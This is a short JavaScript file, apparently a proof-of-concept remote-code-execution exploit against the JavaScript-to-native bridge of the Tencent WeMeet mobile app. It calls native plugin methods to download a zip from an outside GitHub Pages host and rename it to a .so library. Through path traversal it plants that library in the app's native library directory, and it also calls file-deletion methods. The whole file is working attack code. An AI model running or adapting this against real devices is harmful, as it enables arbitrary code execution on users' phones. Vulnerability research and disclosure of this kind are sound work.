(function(){
  document.title='P119PAY';
  window.__p119=function(r){
    try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
    try{JSCallJavaMgr.JSCallNative(JSON.stringify({module:'CommonPlugin',method:'PrintLog',param:{log:'P119CB='+JSON.stringify(r)},callId:'P119LOG'}))}catch(e){}
    document.title='P119CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
  };
  function c(id,mod,m,p){
    document.title='P119RUN:'+id;
    JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p119',module:mod,method:m,param:p,callId:id}));
  }
  if(!window.JSCallJavaMgr){document.title='P119-NOBRIDGE';return}
  var ideaId='1';
  var q=[
    ['H0','CommonPlugin','GetPerformance',{}],
    ['E1','IdeaWebViewPlugin','GetExportFileLocalPath',{idea_id:ideaId,fileName:'p50.zip'}],
    ['E2','IdeaWebViewPlugin','GetExportFileLocalPath',{idea_id:ideaId}],
    ['E3','CommonPlugin','GetExportFileLocalPath',{fileName:'p50.zip'}],
    ['I1','IdeaWebViewPlugin','GetImageLocalPath',{idea_id:ideaId,cos_id:'1',url:'https://gitwhs.github.io/wm-poc-rce/p50.zip'}],
    ['R1','IdeaWebViewPlugin','RenameImage',{idea_id:ideaId,old_name:'p50.zip',new_name:'libp119.so'}],
    ['R2','IdeaWebViewPlugin','RenameImage',{idea_id:ideaId,src:'p50.zip',dst:'../../com.tencent.wemeet.app/files/lib/libp119.so'}],
    ['D1','IdeaWebViewPlugin','DeleteExportFilePath',{fileName:'p40.bin'}],
    ['D2','CommonPlugin','DeleteExportFilePath',{fileName:'p40.bin'}]
  ];
  var i=0;
  function n(){if(i>=q.length){document.title='P119-DONE';return}var x=q[i++];c(x[0],x[1],x[2],x[3]);setTimeout(n,900)}
  setTimeout(n,800);
})();
